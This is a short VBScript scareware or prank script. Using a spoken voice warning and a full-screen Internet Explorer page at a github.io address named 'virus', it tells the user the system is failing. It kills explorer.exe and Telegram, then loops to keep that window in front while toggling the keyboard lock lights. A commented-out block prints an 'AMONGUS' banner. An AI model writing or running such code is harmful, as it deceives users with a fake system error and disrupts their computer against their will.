Set speaker = CreateObject("SAPI.SpVoice")
Set shell = CreateObject("WScript.Shell")
Set objShell = CreateObject("Shell.Application")
Set oShell = WScript.CreateObject ("WScript.Shell")



speaker.Speak "Warning. System works incorrectly"


objShell.MinimizeAll
WScript.Sleep 500

Set IE = CreateObject("InternetExplorer.Application")
IE.Navigate "https://zala0987654321.github.io/virus"
IE.Visible = True
IE.FullScreen = True

oShell.run "taskkill /f /im explorer.exe", 0, True
shell.Run "taskkill /F /IM Telegram.exe", 0, True

' i = 0
' do
' oShell.run "cmd /C mode 170, 100 & echo ................ & echo ...AMONGUS...... & echo .UNA.....M...... & echo .SGO.....N...... & echo .MOGUSAMON...... & echo ...G.....U...... & echo ...SA....MO..... & pause"
' i = i+1
' loop while (i < 1)
Set oShell = Nothing


On Error Resume Next ' Игнорируем ошибки, когда окно будет закрыто легально
Do While IE.Visible = True
    WScript.Sleep 100 ' Проверка каждые 0.1 сек
    shell.AppActivate "https://zala0987654321.github.io/ - CRITICAL_SYSTEM_ERROR - Internet Explorer" ' Заголовок (Title) вашей HTML страницы
    WScript.Sleep 10
    shell.SendKeys "{NUMLOCK}"
    WScript.Sleep 10
    shell.SendKeys "{CAPSLOCK}"
    WScript.Sleep 10
    shell.SendKeys "{SCROLLLOCK}"
Loop